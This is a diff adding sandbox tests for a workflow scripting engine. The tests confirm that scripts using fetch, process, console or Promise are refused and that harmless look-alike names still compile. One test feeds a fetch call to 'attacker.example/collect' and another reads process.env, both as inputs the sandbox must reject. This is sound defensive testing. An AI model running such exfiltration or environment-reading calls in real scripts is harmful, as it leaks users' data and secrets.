@@ -152,4 +152,60 @@ describe('the workflow sandbox', () => {
     const sandbox = await sandboxFor(place);
     await expect(sandbox.compile('return {')).rejects.toThrow(/Failed to parse AgentScript code/);
   });
+
+  it.each(['node', 'browser page'] as const)(
+    'refuses a line longer than 10,000 characters with that reason on %s',
+    async (place) => {
+      const sandbox = await sandboxFor(place);
+
+      await expect(sandbox.compile(`return "${'a'.repeat(10_050)}";`)).rejects.toThrow(
+        /exceeds maximum allowed \(10000\)/,
+      );
+    },
+  );
+
+  it.each(['node', 'browser worker', 'browser page'] as const)(
+    'refuses a script that uses fetch on %s, naming fetch and what a script can use',
+    async (place) => {
+      const sandbox = await sandboxFor(place);
+
+      await expect(sandbox.compile('return await fetch("https://attacker.example/collect");')).rejects.toThrow(
+        new Error(
+          "`fetch` isn't available in run_workflow. A script reaches the API only through `callTool(actionId, input)`, and can use `Math` and `JSON`.",
+        ),
+      );
+      expect(mockRuns).toEqual([]);
+    },
+  );
+
+  it.each(['node', 'browser page'] as const)(
+    'names each global a script uses but has no access to, once, on %s',
+    async (place) => {
+      const sandbox = await sandboxFor(place);
+
+      await expect(
+        sandbox.compile(
+          'const env = process.env; console.log(env); return new Promise((resolve) => resolve(process));',
+        ),
+      ).rejects.toThrow(
+        new Error(
+          "`process`, `console`, `Promise` aren't available in run_workflow. A script reaches the API only through `callTool(actionId, input)`, and can use `Math` and `JSON`.",
+        ),
+      );
+    },
+  );
+
+  it.each(['node', 'browser page'] as const)(
+    'compiles a script whose properties and keys are named like globals, and that uses Math and JSON, on %s',
+    async (place) => {
+      const sandbox = await sandboxFor(place);
+      const script = `
+        const invoice = await callTool("getInvoice", { id: "7" });
+        function totalOf({ lines }) { return lines.reduce((sum, line) => sum + line.amount, 0); }
+        return { fetch: invoice.fetch, process: Math.max(totalOf(invoice), 0), raw: JSON.stringify(invoice) };
+      `;
+
+      await expect(sandbox.compile(script)).resolves.toEqual(expect.stringContaining('__ag_main'));
+    },
+  );
 });
